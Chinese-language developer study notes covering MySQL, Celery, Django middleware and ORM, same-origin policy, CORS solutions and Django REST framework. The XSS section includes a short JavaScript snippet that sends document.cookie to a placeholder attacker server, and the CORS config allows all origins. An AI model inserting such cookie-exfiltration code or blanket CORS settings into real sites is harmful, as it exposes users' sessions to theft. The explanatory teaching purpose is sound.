2、创建唯一性索引，保证数据库表中每一行数据的唯一性。
3、加速表和表之间的连接。
4、在使用分组和排序子句进行数据检索时，可以显著减少查询中分组和排序的时间。

缺点：

1、索引需要占物理空间。
2、当对表中的数据进行增加、删除和修改的时候，索引也要动态的维护，降低了数据的维护速度。
```

## Mysql集群的优缺点？

优点：

* 99.999%的高可用性
* 快速的自动失效切换
* 灵活的分布式体系结构，没有单点故障
* 高吞吐量和低延迟
* 可扩展性强，支持在线扩容
  缺点：
* 存在很多限制，比如：不支持外键
* 部署、管理、配置很复杂
* 占用磁盘空间大、内存大
* 备份和恢复不方便
* 重启的时候，数据节点将数据load到内存需要很长的时间

# 集群

有很多项目，客户端发送请求的时候，前面加上nginx,发送请求的时候发送给nginx，主要做反向代理和转发，负载均衡，比如有10个请求，有权重，配置参数，这个可以让接口能够解压服务器的压力。

# 微服务

就是把一个大项目分解成为多个小项目。比如用户模块，内容模块，不同模块直接是需要进行调用的，resful接口的方式进行调用，还有一种就是rpc（远程过程调用，基于socket写的，的），大型项目一般使用其他语言。调用远程的函数像调用本地的一样，通过框架（谷歌的grpc,或者阿里开源的dubbo）。

拆成多个项目之后，部署在不同的机器上，或者同一个机器上，如果对于某一个模块访问过多，可以部署在多台服务器上，经过aginx进行转发，这样就可以做到访问。都可以部署到docker 上，这个可以快熟的进行部署。

# celery

## Celery分布式任务队列

```python
原因：用户发起请求并等待响应返回，此过程可能需要执行一段时间，用户等待很长时间，造成不好的用户体验。
解决方案：将耗时的程序放到celery中执行并将耗时的任务添加到队列queue中，即使用Redis实现broke中间人，然后用多个worker去监听队列里的任务去执行
流程：客户端--->任务发送--->任务队列（broker）<---获取任务处理<---任务处理者（worker）
重要概念：
1）任务task：一个python函数
2）队列queue：将需要执行的任务加入到队列中
3）工人worker：在一个新进程中，负责执行队列中的任务
4）代理人broker：负责调度，在布置环境中使用Redis
正向代理：请求经过代理服务器从局域网发出，然后到达互联网上的服务器，特点是服务端不知道真正的客户端是谁
反向代理：请求从互联网发出，先进入代理服务器，再转发给局域网内的服务器，特点是客户端并不知道真正的服务端是谁，而两种的区别是正向代理的对象是客户端，反向代理的对象是服务端
```



运用场景：注册的功能，在用户使用邮箱注册成功之后，需要给该邮箱发送一封激活邮件。如果直接放在应用中，则调用发邮件的过程会遇到网络IO的阻塞，比较好的处理方式则是使用异步任务，将发邮件从主业务中解耦出来，应用在业务逻辑中触发一个异步任务。或者有上传任务，处理上传图片，上传视频等。执行命令的时候也可以异步执行。

定时任务：一般会用在爬虫上，研究网站的更新速度，进行定时爬取。爬取到的内容先放在redis中进行去重，然后存储到数据库中。



## 异步任务

异步任务是web开发中一个很常见的方法。对于一些耗时耗资源的操作，往往从主应用中隔离，通过异步的方式执行。


## 二、生产者消费者模式

生产者生成消息，缓存到消息队列中，消费者读取消息队列中的消息并执行。
生产者消费者模式面向过程的一种编程模式。在实际的软件开发过程中，经常会碰到如下场景：某个模块负责产生数据，这些数据由另一个模块来负责处理（此处的模块是广义的，可以是类、函数、线程、进程等）。产生数据的模块，就形象地称为生产者；而处理数据的模块，就称为消费者。

## 三、celery

celery是基于python实现的一个异步任务的调度工具，同时还是一个任务队列，主要用于处理耗时的任务。
celery本身不含消息服务，需要依赖一个消息队列MQ来来传递任务，客户端代码只需要向MQ中派发任务，Celery进程就可以从MQ中读取消息并派发给worker，从而达到了客户端程序与Celery进程解耦的效果。而且Celery进程并不需要监听任何端口，减少了配置的复杂性。目前，Celery支持的消息服务有RabbitMQ、Redis甚至是数据库，当然Redis应该是最佳选择。

### （1）celery架构

celery架构由三个模块组成：消息中间件（message broker），任务执行单元（worker）和任务执行结果存储（task result store）组成。

消息中间件（Broker）: 消息中间人，是任务调度队列，是一个独立的服务，是一个生产者消费者模式，生产者把任务放入队列中，消费者（worker）从任务队列中取出任务执行，任务的执行可以按照顺序依次执行也可以按照计划时间进行。但是Broker本身不提供队列服务，所以要集成第三方队列，推荐使用RatbbitMQ或Redis.

任务执行单元（worker）：即执行任务的程序，可以有多个并发。它实时监控消息队列，获取队列中调度的任务，并执行它。

任务执行结果存储（task result store）：由于任务的执行同主程序分开，如果主程序想获取任务执行的结果，就必须通过中间件存储。同消息中间人一样，存储也可以使用RabbitMQ、Redis；另外，假如不需要保存执行的结果也可以不配置这个模块。

## （2）celery特点

简单：Celery 易于使用和维护，并且它不需要配置文件
高可用性：倘若连接丢失或失败，进程和客户端会自动重试，并且通过主/主或主/从方式复制来提高可用性
快速：单个 Celery 进程每分钟可处理数以百万计的任务，而保持往返延迟在亚毫秒级
灵活：Celery 几乎所有部分都可以扩展或单独使用。可以自制连接池、序列化、压缩模式、日志、调度器、消费者、生产者、自动扩展、中间人传输或更多。

## （3）工作原理

它的基本工作就是管理分配任务到不同的服务器，并且取得结果。至于说服务器之间是如何进行通信的？这个Celery本身不能解决。所以，RabbitMQ作为一个消息队列管理工具被引入到和Celery集成，负责处理服务器之间的通信任务。和rabbitmq的关系只是在于，celery没有消息存储功能，他需要介质，比如rabbitmq、redis、mysql、mongodb 都是可以的。

（4）celery应用

们通常使用它来实现异步任务（async task）和定时任务（crontab）。它的架构组成如下图 

![img](https://img2018.cnblogs.com/blog/462684/201810/462684-20181028131702577-643068583.png)

1、任务（tasks）--用户定义的函数，用于实现用户的功能，比如执行一个耗时很长的任务

2、中间介（Broker）--用于存放tasks的地方，但是这个中间介需要解决一个问题，就是可能需要存放非常非常多的tasks，而且要保证Worker能够从这里拿取

3、执行者（Worker）--用于执行tasks，也就是真正调用我们在tasks中定义的函数

4、存储（Backend）--把执行tasks返回的结果进行存储，以供用户查看或调用



Celery中，以上组件具体功能如下：

**任务模块 Task**

包含异步任务和定时任务。其中，异步任务通常在业务逻辑中被触发并发往任务队列，而定时任务由 Celery Beat 进程周期性地将任务发往任务队列。

**消息中间件 Broker**

Broker，即为任务调度队列，接收任务生产者发来的消息（即任务），将任务存入队列。Celery 本身不提供队列服务，官方推荐使用 RabbitMQ 和 Redis 等。

**任务执行单元 Worker**

Worker 是执行任务的处理单元，它实时监控消息队列，获取队列中调度的任务，并执行它。

**任务结果存储 Backend**

Backend 用于存储任务的执行结果，以供查询。同消息中间件一样，存储也可使用 RabbitMQ, Redis 和 MongoDB 等。

# Django

## 聚合查询 与分组查询



```
# 聚合查询 与分组查询
    from django.db.models import Avg,Sum,Max,Min,Count

    # res = models.Book.objects.all().aggregate(Avg('price'))  # 平均值
    # res1 = models.Book.objects.all().aggregate(Max('price'))  # 最大值
    # res2 = models.Book.objects.all().aggregate(Min('price'))  # 最小值
    # res3 = models.Book.objects.all().aggregate(Sum('price'))  # 求和
    # res4 = models.Book.objects.all().aggregate(Count('name'))  # 求总数，个数
    # # print(res,res1,res2,res3,res4)
    # 根据最大值求其他的字段
    # res = models.Book.objects.all().aggregate(Max('price'))
    # print(res, type(res))
    # print(res.get('price__max'), type(res.get('price__max')))
    # res = models.Book.objects.filter(price=res.get('price__max'))
    # print(res.first().name)
    # 聚合语句的组合使用
    # res = models.Book.objects.all().aggregate(Min('price'), Max('price'), Count('price'), sum=Sum('price'),
    #                                           ave=Avg('price'))
    # print(res)
    res = models.Book.objects.annotate(name_num = Count('name')).values('name_num')
    print(res)
```



## request生命周期

而Django的生命周期内到底发生了什么呢??

```python
1. 当用户在浏览器中输入url时,浏览器会生成请求头和请求体发给服务端
请求头和请求体中会包含浏览器的动作(action),这个动作通常为get或者post,体现在url之中.

2. url经过Django中的wsgi,再经过Django的中间件,最后url到过路由映射表,在路由中一条一条进行匹配,
一旦其中一条匹配成功就执行对应的视图函数,后面的路由就不再继续匹配了.
3. 视图函数根据客户端的请求查询相应的数据.返回给Django,然后Django把客户端想要的数据做为一个字符串返回给客户端.
4. 客户端浏览器接收到返回的数据,经过渲染后显示给用户.
```

## 中间件

process_request方法都执行完后，匹配路由，找到要执行的视图函数，先不执行视图函数，先执行中间件中的process_view方法，process_view方法返回None，继续按顺序执行，所有process_view方法执行完后执行视图函数。假如中间件3 的process_view方法返回了HttpResponse对象，则4,5,6的process_view以及视图函数都不执行，直接从最后一个中间件，也就是中间件6的process_response方法开始倒序执行

### **什么是中间件？**

**django中间件是django的门户 任何的请求来和响应走都需要经过中间件，所以中间件在做一些网站全局性的功能时特别好用**

### 中间件能做什么？

1. 用户访问频率限制
2. 用户是否是黑名单 白名单
3. 所有用户登录校验
4. 只要是涉及到网址全局的功能 你就应该考虑使用中间件

### 中间件流程

![img](https://images2018.cnblogs.com/blog/1342004/201806/1342004-20180626145355317-56223999.png)

1. ### process_request

   1.请求来的时候 会按照settings配置文件中从上往下的顺序依次执行每一个中间件里面的process_request方法 
   2.中间件里面如果没有定义该方法 直接跳过执行下一个
   3.process_request方法 内如果你自己返回了HttpResponse对象 那么不再往后执行  直接跳到同级别的process_response方法

   ```
    def process_request(self,request):
           print('我是第一个自定义中间件里面的process_request方法')
           return HttpResponse("我是第一个自定义中间件里面的HttpResponse对象返回值")  # 直接原地返回
   ```

2. #### process_response

   1. 响应走的时候 会按照settings配置文件中从下往上的顺序依次执行每一个中间件里面的process_response
   2. 该方法必须将形参response返回
   3. 如果没有定义该方法 直接跳过执行下一个

### 自定义中间件

    from django.utils.deprecation import MiddlewareMixin
    
        class MD1(MiddlewareMixin):
        def process_request(self, request):
            print("MD1里面的 process_request")
## Django请求流程图

![img](https://images2018.cnblogs.com/blog/1342004/201806/1342004-20180626154937295-1082559119.png)

## 1. Django ORM查询中select_related和prefetch_related的区别？？

```
def select_related(self, *fields)
    性能相关：表之间进行join连表操作，一次性获取关联的数据。

    总结：
    1. select_related主要针一对一和多对一关系进行优化。
    2. select_related使用SQL的JOIN语句进行优化，通过减少SQL查询的次数来进行优化、提高性能。

def prefetch_related(self, *lookups)
    性能相关：多表连表操作时速度会慢，使用其执行多次SQL查询在Python代码中实现连表操作。

    总结：
    1. 对于多对多字段（ManyToManyField）和一对多字段，可以使用prefetch_related()来进行优化。
    2. prefetch_related()的优化方式是分别查询每个表，然后用Python处理他们之间的关系。
```

## only 和 defer 的区别?

```
defer('id','name'):取出对象，字段除了id和name都有
only('id','name'):取的对象，只有id和name
```

## 2. Django ORM是什么？

```
对象关系映射，通过models中的类来对应数据库中的一个表，一个对象对应一个数据行，一个属性对应数据库中的一个字段
```

### **F 对象**

作用：用于类属性之间的比较条件。

```
1. from django.db.models import F 
2. 例：where bread > bcomment BookInfo.objects.filter(bread__gt =F(‘bcomment’)) 
3. 例：BookInfo.objects.filter(bread__gt=F(‘bcomment’)*2) 
```

### **Q 对象**

作用：用于查询时的逻辑条件。可以对 Q 对象进行&|~操作。

```
1. from django.db.models import Q  
2. BookInfo.objects.filter(id__gt=3， bread__gt=30) 
3. BooInfo.objects.filter(Q(id__gt=3) & Q(bread__gt=3)) 
4. 例：BookInfo.objects.filter(Q(id__gt=3) | Q(bread__gt=30)) 
5. 例：BookInfo.objects.filter(~Q(id=3)) 
```



## Auth模块是什么

使用auth模块 必须用全套 不是自己写一部分 用别人一部分

**Auth模块是Django自带的用户认证模块：**

我们在开发一个网站的时候，无可避免的需要设计实现网站的用户系统。此时我们需要实现包括用户注册、用户登录、用户认证、注销、修改密码等功能，这还真是个麻烦的事情呢。

Django作为一个完美主义者的终极框架，当然也会想到用户的这些痛点。它内置了强大的用户认证系统--auth，它默认使用 auth_user 表来存储用户数据。

python manage.py createsuperuser

from django.contrib import auth

## Django 自定义装饰器进行登录访问限制

我们在设计网站用户系统的时候，往往需要进行登录访问限制，比如说用户还没有登录的时候，有些网页是不能访问的。

最简单粗暴的办法是，在每个页面的函数最开始加一个 **登录验证函数**，检查当前用户登录状态：如果已经登陆过，那么继续往下执行；如果用户还没登录，对不起，出门左转到登录页。

在 python 中有个优雅的解决办法——使用 **装饰器**。Django 中有提供使用装饰器进行登录访问限制的方法，详情可见 [django实现用户登陆访问限制@login_required](http://blog.51cto.com/alsww/1732435)，如果对自己实现这套机制感兴趣的童靴，可以继续往下看。

### 装饰器

首先简单介绍一下装饰器，装饰器相当于在一个函数外面又套了一层函数，将原函数集成到一段新的代码中，执行的时候直接运行外面这层函数，这样做的优点是可以动态扩展函数的功能。

装饰器在 python 中的用法十分简单，外层函数放在原函数前，加@表示：

```
@work
def foo(a,b):
    ......
```

### 将装饰器用于登录验证

上节中可以看出，装饰器的使用十分简单和优雅。在用户系统中，我们可以把 **登录验证函数** 作为装饰器放在每一个页面的函数前面。

首先 **定义装饰器**，装饰器其实也是一个函数，只不过 **它把一个函数作为参数传进来，返回了另一个替换函数**。在这里装饰器的作用是检查登录状态，如果已经登录，运行原函数，如果未登录，跳转到登录页。

```
def my_login_required(func):
    '''自定义 登录验证 装饰器'''
    def check_login_status(request):
        '''检查登录状态'''
        if request.session.has_key('user_id'):
            # 当前有用户登录，正常跳转
            return func(request)
        else:
            # 当前没有用户登录，跳转到登录页面
            return HttpResponseRedirect('/login')
    return check_login_status
```

使用装饰器就简单了，把装饰器函数加到需要访问限制的页面函数之前即可：

```
@my_login_required
def index(request):
    '''主页'''
    .......
    return render(request,'index.html',locals())
```

如此，在渲染主页之前，需要先进入装饰器 `my_login_required` 中验证登录状态，如果已经登录，才可以访问主页，否则，跳转到登录页面。

## django-cors-header解决请求跨域问题

### xss攻击

XSS攻击是Web攻击中最常见的攻击方法之一，它是通过对网页注入可执行代码且成功地被浏览器 执行，达到攻击的目的，形成了一次有效XSS攻击，一旦攻击成功，它可以获取用户的联系人列 表，然后向联系人发送虚假诈骗信息，可以删除用户的日志等等，有时候还和其他攻击方式同时实 施比如SQL注入攻击服务器和数据库、Click劫持、相对链接劫持等实施钓鱼，它带来的危害是巨 大的，是web安全的头号大敌。

### 攻击的条件

实施XSS攻击需要具备两个条件：

　　一、需要向web页面注入恶意代码；

　　二、这些恶意代码能够被浏览器成功的执行。

### XSS攻击能做些什么

1.窃取cookies，读取目标网站的cookie发送到黑客的服务器上，如下面的代码：

```
var i=document.createElement("img")
document.body.appendChild(i)
i.src = "http://www.hackerserver.com/?c=" + document.cookie
```

2.读取用户未公开的资料，



### 什么是浏览器同源策略

[同源策略https://www.cnblogs.com/laixiangran/p/9064769.html](https://www.cnblogs.com/laixiangran/p/9064769.html)

同源策略（Same origin policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说 Web 是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。

它的核心就在于它认为自任何站点装载的信赖内容是不安全的。当被浏览器半信半疑的脚本运行在沙箱时，它们应该只被允许访问来自同一站点的资源，而不是那些来自其它站点可能怀有恶意的资源。

所谓同源是指：域名、协议、端口相同。

下表是相对于 `http://www.laixiangran.cn/home/index.html` 的同源检测结果：

![img](https://note.youdao.com/yws/api/personal/file/9932BCD648DE4CACB29A563116CE962B?method=download&shareKey=7fad5abd13151856c933a2bc9064a83a)

另外，同源策略又分为以下两种：

1. DOM 同源策略：禁止对不同源页面 DOM 进行操作。这里主要场景是 iframe 跨域的情况，不同域名的 iframe 是限制互相访问的。
2. XMLHttpRequest 同源策略：禁止使用 XHR 对象向不同源的服务器地址发起 HTTP 请求。

### 为什么要有跨域限制

因为存在浏览器同源策略，所以才会有跨域问题。那么浏览器是出于何种原因会有跨域的限制呢。其实不难想到，跨域限制主要的目的就是为了用户的上网安全。

如果浏览器没有同源策略，会存在什么样的安全问题呢。下面从 DOM 同源策略和 XMLHttpRequest 同源策略来举例说明：

**如果没有 DOM 同源策略，也就是说不同域的 iframe 之间可以相互访问，那么黑客可以这样进行攻击：**

1. 做一个假网站，里面用 iframe 嵌套一个银行网站 `http://mybank.com`。
2. 把 iframe 宽高啥的调整到页面全部，这样用户进来除了域名，别的部分和银行的网站没有任何差别。
3. 这时如果用户输入账号密码，我们的主网站可以跨域访问到 `http://mybank.com` 的 dom 节点，就可以拿到用户的账户密码了。

**如果 XMLHttpRequest 同源策略，那么黑客可以进行 CSRF（跨站请求伪造） 攻击：**

1. 用户登录了自己的银行页面 `http://mybank.com`，`http://mybank.com` 向用户的 cookie 中添加用户标识。
2. 用户浏览了恶意页面 `http://evil.com`，执行了页面中的恶意 AJAX 请求代码。
3. `http://evil.com` 向 `http://mybank.com` 发起 AJAX HTTP 请求，请求会默认把 `http://mybank.com` 对应 cookie 也同时发送过去。
4. 银行页面从发送的 cookie 中提取用户标识，验证用户无误，response 中返回请求数据。此时数据就泄露了。
5. 而且由于 Ajax 在后台执行，用户无法感知这一过程。

因此，有了浏览器同源策略，我们才能更安全的上网。

### 跨域的解决方法

从上面我们了解到了浏览器同源策略的作用，也正是有了跨域限制，才使我们能安全的上网。但是在实际中，有时候我们需要突破这样的限制，因此下面将介绍几种跨域的解决方法。

## 前端跨域问题产生原因和解决方法

### 一、产生原因

* 跨域是a页面想要获取b页面资源，如果a,b页面的协议、域名、端口号、子域名不同，所进行的访问都是跨域的，而浏览器一般为了安全都限制了跨域访问，也就是不允许跨域访问资源。

### 二、解决办法

#### 1.JSONP

* JSONP是一个非官方协议，它允许在服务器端集成script tags返回至客户端，通过javascript callback的形式实现跨域访问。
* 基本思想：网页通过添加一个`<script>`元素，向服务器请求JSON数据，这种做法不受同源策略限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。



```xml
    <script type="text/javascript">
        function jsonpCallback(result){
            //alert(result);
            for(var i in result){
                alert(i + ":" + result[i]);     //循环输出
            }
        }
        var JSONP = document.createElement("script");
        JSONP.type = "text/javascript";
        JSONP.src = "http://crossdomain.com/services.php?callback=jsonpCallback";
        document.getElementsByTagName("head")[0].appendChild(JSONP);
    </script>
```

#### 2.window.name

* window.name+iframe需要目标服务器响应window.name，window对象有一个name属性，该属性有个特征：即在一个窗口（window）的生命周期内，窗口载入的所有的页面都是共享一个window.name的，每个页面对window. name都有读写的权利，window.name 是持久存在一个窗口载入过的所有页面中的！

#### 3.window.postMessage

* HTML5引入了一个全新的API：跨文档消息传输Cross Document Messaging 。它的目标是在一个单独的持久连接上提供全双工、双向通信。（同源策略对web sockets不适用）
* web sockets原理：在JS创建了web sockets之后，会有一个HTTP请求发送到浏览器以发起连接。取得服务器响应后，建立的连接会使用HTTP升级从HTTP协议交换为web sockets协议。
* `otherWindow.postMessage(message, targetOrigin)`
  otherWindow：指目标窗口，也就是给哪个窗口发消息，是window.frames属性的成员或者由window.open方法创建的窗口。
  参数说明：
  (1)message：是要发送的消息，类型为string，object
  (2)targetOrigin：是限定消息接收范围，不限制使用“ * ”

#### 4.CORS

* 基本思想：使用自定义的HTTP头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。

#### 5.web sockets

* web sockets是浏览器的一种API，它的目标是在一个单独的持久连接上提供全双工、双向通信。(同源策略对web sockets不适用)
* web sockets原理：在JS创建了web socket之后，会有一个HTTP请求发送到浏览器以发起连接。取得服务器响应后，建立的连接会使用HTTP升级从HTTP协议交换为web sockt协议。



#### 6.**django-cors-headers**

```python
pip install django-cors-headers
INSTALLED_APPS = [

    # pip install django-cors-headers
    # 解决同源策略
    'corsheaders',
    # 添加drf
    'rest_framework',
    # 评论
    "comments",
]
MIDDLEWARE = [
    ...
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    # 跨域中间件
    'corsheaders.middleware.CorsMiddleware',
]

# 4.添加白名单
# 指定可以跨域访问当前服务器(127.0.0.1:8000)的白名单
# CORS_ORIGIN_WHITELIST = (
#     # '127.0.0.1:8080',
#     # 'localhost:8080',
# )
# 指定在跨域访问中，后台是否支持传送cookie
# 允许跨域源
CORS_ORIGIN_ALLOW_ALL = True
# 设置请求方式
CORS_ALLOW_METHODS = (
    'DELETE',
    'GET',
    'OPTIONS',
    'PATCH',
    'POST',
    'PUT',
    'VIEW',
)
设置请求头
CORS_ALLOW_HEADERS = (
    'XMLHttpRequest',
    'X_FILENAME',
    'accept-encoding',
    'authorization',
    'content-type',
    'dnt',
    'origin',
    'user-agent',
    'x-csrftoken',
    'x-requested-with',
    'Pragma',
)

```

# django-rest-fromwork

1.drf倾向于哪些方面（核心）

restful核心

序列化

## 特点

1.返回的时候会禁用csrf,框架做

```

# drf 的封装风格--功能都在工具包下面
# 视图
from rest_framework.views import APIView
# 响应
#   返回字符串，json字符串都可以
from rest_framework.response import Response
# 请求
from rest_framework.request import Request
# 过滤
from rest_framework.filters import SearchFilter
# 分页
from rest_framework.pagination import PageNumberPagination
# 异常
from rest_framework.exceptions import APIException
# 认证
from rest_framework.authentication import BaseAuthentication
# 校验
from rest_framework.permissions import IsAuthenticated
# 频率
from rest_framework.throttling import SimpleRateThrottle
# 设置
from rest_framework.settings import APISettings
# 网络状态码
from rest_framework import status
# 渲染
from rest_framework.renderers import JSONRenderer,BrowsableAPIRenderer
# 解析
from rest_framework.parsers import JSONParser  # json格式
from rest_framework.parsers import FormParser #表单格式
from rest_framework.parsers import MultiPartParser#多部份解析器

# drf的认识
from rest_framework.views import APIView
from rest_framework.generics import CreateAPIView
from rest_framework.generics import DestroyAPIView
from rest_framework.generics import ListAPIView
from rest_framework.generics import ListCreateAPIView
from rest_framework.generics import RetrieveAPIView
from rest_framework.generics import RetrieveDestroyAPIView
from rest_framework.generics import RetrieveUpdateAPIView
from rest_framework.generics import RetrieveUpdateDestroyAPIView
from rest_framework.generics import UpdateAPIView

"""
from rest_framework.request import Request
drf的request模块
1.drf的request是在wsgi的request的基础删从新封装
2.wsgi的request作为drf的request的一个属性：_request
3.新的request对旧的request做了完全兼容
4.新的request对数据解析更加的规范化，所有的拼接参数都解析到request.query_params中，所有的数据包都被解析到data中
5.所有的数据包（post请求）都在request.data
6.QueryDict类型可以直接.dict()，转换成dict类型
7. request.META请求头
"""
from django.http.request import QueryDict
class BookAPIView(APIView):
    def get(self, request, *args, **kwargs):
        # http://127.0.0.1:8000/api/drfbooks/?aaa=123456
        print(request)  # <rest_framework.request.Request object at 0x000002294787A7F0>
        print(request._request)  # <WSGIRequest: GET '/api/drfbooks/?aaa=123456'>
        print(request._request.GET)  # <QueryDict: {'aaa': ['123456']}>
        print(request.GET)  # <QueryDict: {'aaa': ['123456']}>
        print(request.META)  # 打印请求头
        return Response('get ok')

    def post(self, request, *args, **kwargs):
        # print(request)#<rest_framework.request.Request object at 0x00000190FADF8908>
        # print(request._request)#<WSGIRequest: POST '/api/drfbooks/'>
        # print(request._request.POST)#<QueryDict: {'ccc': ['123456']}>
        # print(request.POST)#<QueryDict: {'ccc': ['123456']}>
        #
        # print(request.body)#b'ccc=123456'


        print(request.query_params)  # <QueryDict: {'xyz': ['123']}>
        print(request.query_params.dict())  # <QueryDict: {'xyz': ['123']}>
        # print(request.data)  # <QueryDict: {'ccc': ['123456']}>
        if isinstance(request.data, QueryDict):
            print(request.data)#<QueryDict: {'ccc': ['123456']}>
            print(request.data.dict())#{'ccc': '123456'}原生封装
        print(request.data)

        return Response('post ok')
from django.views.generic import View
from django.views import View

```

## 请求模块

```
"""请求模块

from rest_framework.request import Request
drf的request模块
1.drf的request是在wsgi的request的基础删从新封装
2.wsgi的request作为drf的request的一个属性：_request
3.新的request对旧的request做了完全兼容
4.新的request对数据解析更加的规范化，所有的拼接参数都解析到request.query_params中，所有的数据包都被解析到data中
5.所有的数据包（post请求）都在request.data
6.QueryDict类型可以直接.dict()，转换成dict类型
7. request.META请求头
from rest_framework.request import Request
request 源码分析
1.drf的APIView类，重写了as_view()方法，但是在主体逻辑上还是调用父类的View的as_view(),局部禁用了csrf认证 
    重点：所有继承了drf的基础视图类都不再做csrf认证校验
2.    drf的APIView类：重写了dispatch()，在内部对request进行了二次封装：self.initialize_request(request, *args, **kwargs)
    内部核心：走drf的Request初始化方法__init__:self._request = request
    drf的Request的getter方法__getter__:从下划线的self._request内部取出属性，没取到从drf的Request内部取属性
    
核心：request除了可以访问原wsgi协议的request所有内容，还可以访问 query_params、data
"""
```

## 渲染模块

```
from rest_framework.renderers import JSONRenderer,BrowsableAPIRenderer,MultiPartRenderer,HTMLFormRenderer
"""渲染模块

1. 二次处理响应对象：APIView的dispatch方法 - self.finalize_response(request, response, *args, **kwargs)
2. 获取渲染类对象：进入finalize_response方法 - self.perform_content_negotiation(request, force=True)
3. 从配置文件中得到渲染类对象：perform_content_negotiation -> self.get_renderers() -> [renderer() for renderer in self.renderer_classes]

**核心：可以全局和局部配置视图类支持的结果渲染：默认可以json和页面渲染，学习该模块的目的是开发可以全局只配置json方式渲染**



from rest_framework.renderers import JSONRenderer  # json格式的渲染
from rest_framework.renderers import BrowsableAPIRenderer  # 浏览器格式的渲染
# JSONParser: json数据
# FormParser： urlencoded
# MultiPartParser：form-data

#局部配置
renderer_classes = [JSONRenderer,BrowsableAPIRenderer]
from rest_framework.settings import APISettings
#全局配置，在settings文件夹中进行配置
REST_FRAMEWORK = {
    'DEFAULT_RENDERER_CLASSES': [
        'rest_framework.renderers.JSONRenderer',
        'rest_framework.renderers.BrowsableAPIRenderer',
    ],
    'DEFAULT_PARSER_CLASSES': [
        'rest_framework.parsers.JSONParser',
        'rest_framework.parsers.FormParser',
        'rest_framework.parsers.MultiPartParser',
    ],
}
# 局部禁用 配置空列表
renderer_classes = []
"""
from rest_framework.parsers import JSONParser  # json格式
from rest_framework.parsers import FormParser #表单格式
from rest_framework.parsers import MultiPartParser
class RenderersBookAPIView(APIView):
    # 局部配置渲染
    renderer_classes = [JSONRenderer]


    def get(self, request, *args, **kwargs):
        return Response({"status":0,"msg":"get-ok"})
    parser_classes = [JSONParser,FormParser]

    def post(self, request, *args, **kwargs):
        print(request.data)


        return Response({"status":0,"msg":"post-ok"})

```

## 解析模块

```
# 解析
from rest_framework.parsers import JSONParser  # json格式
from rest_framework.parsers import FormParser #表单格式
from rest_framework.parsers import MultiPartParser#多部份解析
"""drf解析模块，针对数据包
drf的解析模块(了解) - 服务的对象是数据包数据
1、可以在视图类中通过parser_classes类属性对该视图的数据包解析做配置 - 局部配置
2、可以在项目的配置文件的drf配置中通过DEFAULT_PARSER_CLASSES对该视图的数据包解析做配置 - 全局配置

**  核心：请求的数据包格式会有三种（json、urlencoded、form-data），drf默认支持三种数据的解析，可以全局或局部配置视图类具体支持的解析方式**
JSONParser   # json格式
FormParser  #  urlencoded
MultiPartParser #form-data
FileUploadParser #只支持上传文件

1、APIView的dispatch方法：self.initialize_request(request, *args, **kwargs)内部还提供了数据解析
2、self.get_parser_context(request)提供要解析的数据，self.get_parsers()提供解析的类对象（内部从配置中找解析类）
"""
from rest_framework.settings import APISettings
from rest_framework.views import exception_handler
```



## 异常模块

```
"""异常模块
from rest_framework.settings import APISettings
# Exception handling
    'EXCEPTION_HANDLER': 'rest_framework.views.exception_handler',
    'NON_FIELD_ERRORS_KEY': 'non_field_errors',
    
重写异常模块目的是记录异常信息(项目上线)

1、在settings的drf配置中配置EXCEPTION_HANDLER，指向自定义的exception_handler函数
2、异常模块：django项目的所有异常都会被处理，drf能处理的会自己处理(4xx)，不能处理的交给django处理(5xx)改写exception_handler，在全局配置
3、drf出现异常了，都会回调exception_handler函数，携带 异常对象和异常相关信息内容，在exception_handler函数完成异常信息的返回以及异常信息的logging日志
**核心：异常信息都需要被logging记录，所以需要自定义；drf只处理客户端异常，服务器异常需要手动处理，统一处理结果**


# 源码分析
1、在APIView的dispatch方法中，有一个超大的try...except...，将代码运行异常都交给异常处理模块处理self.handle_exception(exc)
2、从配置中映射出配置处理异常的函数(自定义异常模块就是自定义配置指向自己的函数)：self.get_exception_handler()
3、异常函数exception_handler(exc, context)处理异常，就会走自己的：
    先交给系统处理(客户端的异常)，系统没处理(服务器异常)，再自己处理
"""
```



## 响应模块

```

"""响应模块
Response类生成对象需要的参数，以及Response类的对象可以使用的属性
1、参数：Response(data=响应的数据, status=响应的网络状态码, headers=想通过响应头再携带部分信息给前端)
2、属性：response.data  response.status_code  response.status_text
核心：知道response对象产生可以传那些信息，response对象又是如何访问这些信息的
"""
```



## 频率控制

```
# 自定义频率类
from rest_framework.throttling import SimpleRateThrottle
# 1）定义类继承SimpleRateThrottle,重写get_cache_key方法，设置scope类属性
# 2）scope就是一个认证字符串，在配置文件中配置scope字符串对应的频率设置
# 3）get_cache_key的返回值是字符串，该字符串是缓存访问次数的缓存key
class ThreeTimeUserThrottle(SimpleRateThrottle):
    scope = 'three'
    # 当前用户缓存的key
    def get_cache_key(self, request, view):
        return 'throttle:user_%s' % (request.user.id)
```

##  序列化模块

```
 # 序列化模块
  为何使用：后台的数据多以类对象形式存在，经过序列化后，格式化成返回给前台的数据
  序列化：
  1）视图类三步操作：
  a.ORM操作数据库拿到资源数据
  b.序列化返回给前台的数据
  c.返回序列化后的数据
  2）视图类中序列化操作：
  a.直接将要序列化的数据传给序列化类
  b.若序列化数据是单个对象，序列化参数many默认为False，反之是多个对象，序列化参数many修改为True
  3）自定义序列化类：
  a.model类中给前台的字段即系统字段必须跟model类字段名保持一致
  b.自定义序列化字段用SerializerMethodField()，该字段值来源于get_自定义字段名(序列化对象,Model对象)方法的返回值
  
  
  反序列化：
  1）视图类三步操作
  a.从请求对象中获取前台数据
  b.校验前台数据是否合法
  c.反序列化成后台Model对象与数据库交互
  2）视图类中反序列化操作：
  a.将要反序列化的数据传给序列化类的data参数
  b.若反序列化的数据是单个字典，反序列化参数many默认为False，反之是多个字典的对象，反序列化参数many为True
  3）自定义反序列化类
  a.系统字段最好跟model类字段名保持一致，且参数required决定该字段是否必须校验字段
  b.自定义反序列化字段校验规则同系统字段，但在自定义校验规则中将其取出，不参与数据库交互
  c.局部钩子方法命名validate_属性名(self, 属性的value)，校验规则为成功返回属性的value 失败抛出校验错误的异常
  d.全局钩子方法命名 validate(self, 所有属性attrs)，校验规则为成功返回attrs 失败抛出校验错误的异常
```





## 接口

### 什么是接口

​	明确了请求方式，提供对应后台所需参数，请求url链接可以得到后台的响应数据

